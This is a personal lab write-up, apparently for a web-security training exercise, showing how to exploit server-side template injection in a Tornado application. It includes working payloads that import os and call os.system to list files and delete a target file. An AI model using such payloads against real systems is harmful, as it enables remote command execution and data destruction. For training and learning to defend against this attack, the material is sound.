# Lab: Basic server-side template injection (code context)

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the [Tornado documentation](https://www.tornadoweb.org/en/stable/index.html) to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
[Tornado Docs on OS Commands](https://www.tornadoweb.org/en/stable/template.html)

>You can log in to your own account using the following credentials: wiener:peter

The injectable field is in the email and name change field/functionality

**Request**
```HTTP
POST /my-account/change-blog-post-author-display
```

**Response:**
`blog-post-author-display=user.nickname`

The users nick name is displayed in comment section


**Tried this:**
`blog-post-author-display={{user.nickname}}`
Displays nickname in comment section with squirley braces around it

blog-post-author-display=user.nickname}}{{2*2}}
Displays this:
`H0td0g4}}`

So u can break out of the template and force it to do maths
now force it to do os commands

Getting the syntax correct on the exploit was the most difficult part
I knew what to do though
It was the correct number of squirley braces to use, in conjunction with the ones already 
at play on the back end

This caused a syntax error, but got me closer
`blog-post-author-display=user.nickname}}{{% system.os("ls") %}}`

According to the documentation, just need one `{` around the import, and then double `{{ }}`
around the commands/code

`{% import os %} {{os.system('ls')`

This syntax worked
`blog-post-author-display=user.nickname}}{% import os %}{{os.system('ls')`
resulted in
morale.txt H0td0g0

Therefore, now rm morales.txt
`blog-post-author-display=user.nickname}}{% import os %}{{os.system('rm morale.txt')`

### The Correct Syntax
```python
{% import os %}{{os.system('ls')
```

```
=user.nickname}}{% import os %}{{os.system('ls')`
```
Successfully executed the `ls` command

The  full path of the system command / exploit
`blog-post-author-display=user.nickname}}{% import os %}{{os.system('rm /home/carlos/morale.txt')`


```
=user.nickname}}{% import os %}{{os.system('rm
/home/carlos/morale.txt')`
```

And so, the exact syntax of the payload:
```python
{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

